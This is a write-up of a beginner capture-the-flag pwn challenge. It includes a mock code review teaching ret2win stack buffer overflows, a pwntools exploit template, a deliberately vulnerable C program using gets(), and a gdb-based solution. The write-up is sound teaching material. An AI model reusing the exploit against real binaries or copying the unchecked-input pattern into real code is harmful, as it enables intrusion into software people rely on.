# Description
```
 Pwn

Difficulty: Beginner
Author: 0xjeppe

Our new intern has only coded in memory safe languages, but we're trying to optimize, so he has been tasked with re-writing our dough recipe-application in C!

He sent his code to our senior dev for review who added some comments in the code. Upon receiving the reviewed code, the intern accidentally pushed it to production instead of fixing anything.
```

# Attachments
code_review.md
```
#### Code Review of recipe.c

Dear intern, upon reviewing your code, I have left some comments in there that highlight some of the issues I found. But I want to elaborate a little bit here.

#### Understanding vulnerabilities through exploitation

So one day this 1337 hacker in a hoodie reviewed my first C-code, a program similar to yours. He used a "buffer overflow" vulnerability to *redirect program-flow*.
With just a few lines of Python code, he managed to make my program execute a function that was supposed to be secret.

He taught me that in a 64-bit program like yours, when a function is called, the memory consists of:

1) The local variables
2) A register called `RBP` (not important for now)
3) A return address showing the program where to jump back to when returning from the function

And so if one of the local variables is a buffer we can write to with no size protections, then we can overwrite all remaining local variables (if any), the RBP register, and then the return address, fully controlling where the program jumps to.

So, a payload should consist of:

1) Enough bytes to exactly fill the buffer +
2) Bytes to overwrite RBP +
3) The memory address of the function you want to re-direct execution to.

What this actually achieves is it **"overwrites" the saved return address on the stack**. This is the value that **RIP (the Instruction Pointer)** will take when the function returns. This is important because RIP is the register that holds the memory address of the next instruction!

So, if we can write the address of a secret function into that saved return address, then when the function returns, **RIP "points" at that address and it jumps to that function!**

I think the hacker called this "ret2win". It was amazing! He also taught me how to use [pwntools](https://docs.pwntools.com) to build such an exploit; a cool Python framework many pwn'erZ use.

#### No PIE/ASLR

I will not bore you too much with "stack protections", but it is important to understand what the difference is between "no-PIE" and "PIE". You compiled with the ``no-pie no-aslr`` flags.

So when you compile with these flags, that means memory addresses are static. No matter how many times you run the program, the *memory addresses stay the same*. This is not the case when you compile with the ``pie``-flag!

What this means for your program is that a smart attacker can obtain the address of the ``secret_dough_recipe()``-function very easily and write an exploit to return to this function!
There are many ways and tools to obtain the memory addresses of functions in a binary, e.g. `objdump` or a decompiler.

###### exploit.py

I realize this can be a little hard to understand which is why I provided you with an `exploit.py` script to show you how someone could do this to your program. You will need to fill out some variables though, but the Pwntools template will take care of the rest!
```

exploit.py
```
from pwn import *

# Dear intern, try to put in the correct values for the following variables
# This will show you why your current C-code could leak our secret dough recipe!
RECIPE_BUFFER_SIZE = 0
RBP_SIZE = 0
SECRET_ADDRESS = 0x000000
PROMPT = ""

USE_REMOTE = False
REMOTE_HOST = ""
REMOTE_PORT = 0

"""
This is a pwntools template - you do not have to change anything below this
Install pwntools before running:
    python3 -m pip install pwntools

(if you get an error about the environment being externally managed, add --break-system-packages to the command)
"""
if USE_REMOTE:
    io = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
else:
    e = ELF("./recipe")
    io = e.process()

# Building the payload
payload = b"A" * RECIPE_BUFFER_SIZE
payload += b"B" * RBP_SIZE
payload += p64(SECRET_ADDRESS)

# Sending the payload at the right time
io.recvuntil(PROMPT.encode())
io.sendline(payload)
io.interactive()
```


recipe.c
```
// recipe.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

void secret_dough_recipe(void) {
    int fd = open("flag.txt", O_RDONLY);
    sendfile(1, fd, NULL, 100);
}

void vulnerable_dough_recipe() {
    char recipe[16];
    puts("Please enter the name of the recipe you want to retrieve:");
    // Using gets() here is NOT a good idea!! We are not checking the size of the input from the user!
    // The recipe-buffer can only store 16 bytes and the user can input more than that. This could lead to buffer overflows.
    // If an attacker has the address of the secret_dough_recipe function, they could exploit this vulnerability to see our secret recipe!!
    gets(recipe);
}

void public_dough_recipe() {
    puts("Here is the recipe for you!");
    puts("3 eggs and some milk");
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable_dough_recipe();
    puts("Enjoy baking!");
    return 0;
}
```

# Solution
Read code_review.md to gain some knowledge on stack overflow attack. \
Thankfully, the python script is already given and we just need to assign values to the variables. \
In recipe.c, notice char recipe[16] holds 16 bytes worth of chars. This is overflow-able.\
There are no other spaces reserved in this stack frame, so rbp should sit right next to the reserved 16 bytes space. (i think?) \
\
Find the memory address of secret_dough_recipe function using gdb:
```shell
$ gdb ./recipe
...
(gdb) info address secret_dough_recipe
Symbol "secret_dough_recipe" is a function at address 0x4011b6
```
\
Next, fill in the remote host and port as the they appear on the link. \
Finally, execute python script:
```shell
$ python3 exploit.py
```
